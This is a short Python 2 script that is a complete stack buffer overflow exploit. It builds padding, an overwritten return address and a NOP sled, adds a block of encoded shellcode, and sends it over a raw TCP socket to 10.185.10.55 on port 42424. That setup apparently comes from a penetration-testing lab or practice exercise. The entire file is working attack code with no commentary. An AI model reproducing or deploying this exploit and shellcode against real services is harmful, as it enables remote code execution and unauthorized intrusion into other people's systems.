#!/usr/bin/python2
import sys, socket

overflow = (
"\xbb\xd1\x8d\xa1\xf1\xda\xc1\xd9\x74\x24\xf4\x5a\x31\xc9\xb1"
"\x52\x31\x5a\x12\x83\xea\xfc\x03\x8b\x83\x43\x04\xd7\x74\x01"
"\xe7\x27\x85\x66\x61\xc2\xb4\xa6\x15\x87\xe7\x16\x5d\xc5\x0b"
"\xdc\x33\xfd\x98\x90\x9b\xf2\x29\x1e\xfa\x3d\xa9\x33\x3e\x5c"
"\x29\x4e\x13\xbe\x10\x81\x66\xbf\x55\xfc\x8b\xed\x0e\x8a\x3e"
"\x01\x3a\xc6\x82\xaa\x70\xc6\x82\x4f\xc0\xe9\xa3\xde\x5a\xb0"
"\x63\xe1\x8f\xc8\x2d\xf9\xcc\xf5\xe4\x72\x26\x81\xf6\x52\x76"
"\x6a\x54\x9b\xb6\x99\xa4\xdc\x71\x42\xd3\x14\x82\xff\xe4\xe3"
"\xf8\xdb\x61\xf7\x5b\xaf\xd2\xd3\x5a\x7c\x84\x90\x51\xc9\xc2"
"\xfe\x75\xcc\x07\x75\x81\x45\xa6\x59\x03\x1d\x8d\x7d\x4f\xc5"
"\xac\x24\x35\xa8\xd1\x36\x96\x15\x74\x3d\x3b\x41\x05\x1c\x54"
"\xa6\x24\x9e\xa4\xa0\x3f\xed\x96\x6f\x94\x79\x9b\xf8\x32\x7e"
"\xdc\xd2\x83\x10\x23\xdd\xf3\x39\xe0\x89\xa3\x51\xc1\xb1\x2f"
"\xa1\xee\x67\xff\xf1\x40\xd8\x40\xa1\x20\x88\x28\xab\xae\xf7"
"\x49\xd4\x64\x90\xe0\x2f\xef\x95\x4d\x25\xcd\xc1\xaf\x39\x14"
"\x27\x39\xdf\x7c\x57\x6f\x48\xe9\xce\x2a\x02\x88\x0f\xe1\x6f"
"\x8a\x84\x06\x90\x45\x6d\x62\x82\x32\x9d\x39\xf8\x95\xa2\x97"
"\x94\x7a\x30\x7c\x64\xf4\x29\x2b\x33\x51\x9f\x22\xd1\x4f\x86"
"\x9c\xc7\x8d\x5e\xe6\x43\x4a\xa3\xe9\x4a\x1f\x9f\xcd\x5c\xd9"
"\x20\x4a\x08\xb5\x76\x04\xe6\x73\x21\xe6\x50\x2a\x9e\xa0\x34"
"\xab\xec\x72\x42\xb4\x38\x05\xaa\x05\x95\x50\xd5\xaa\x71\x55"
"\xae\xd6\xe1\x9a\x65\x53\x01\x79\xaf\xae\xaa\x24\x3a\x13\xb7"
"\xd6\x91\x50\xce\x54\x13\x29\x35\x44\x56\x2c\x71\xc2\x8b\x5c"
"\xea\xa7\xab\xf3\x0b\xe2")

shellcode = "A" * 146 + "\xc3\x14\x04\x08" + "\x90" * 32 + overflow

try:
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(('10.185.10.55',42424))
	s.send((shellcode + '\r\n'))
	s.close()

except:
	print ("Error connecting to server")
	sys.exit()